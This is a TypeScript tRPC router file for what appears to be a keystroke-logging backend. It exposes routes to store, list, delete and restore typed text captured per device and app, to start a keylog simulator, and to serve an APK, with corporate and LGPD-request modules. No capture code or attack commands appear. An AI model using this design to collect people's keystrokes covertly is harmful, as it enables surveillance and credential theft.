import { z } from "zod";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { apkRouter } from "./routers/apk";
import { corporateRouter } from "./routers/corporate";
import { lgpdRequestsRouter } from "./routers/lgpd-requests";
import { getUserDevicesSummary } from "./corporate-db";

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    
    create: protectedProcedure
      .input(z.object({
        deviceId: z.string(),
        appName: z.string(),
        keyText: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        await createKeylog({
          deviceId: input.deviceId,
          userId: ctx.user.id,
          appName: input.appName,
          keyText: input.keyText,
        });
        return { success: true };
      }),
    
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await deleteKeylog(input.keylogId);
        return { success: true };
      }),
    
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await restoreKeylog(input.keylogId);
        return { success: true };
      }),
    
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    
    startSimulator: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await startKeylogSimulator(input.deviceId, ctx.user.id);
        return { success: true, message: "Simulador de keylogs iniciado" };
      }),
  }),

  device: router({
    list: protectedProcedure.query(async ({ ctx }) => {
      return await getUserDevicesSummary(ctx.user.id);
    }),
  }),

  corporate: corporateRouter,
  apk: apkRouter,
  lgpd: lgpdRequestsRouter,
});

export type AppRouter = typeof appRouter;
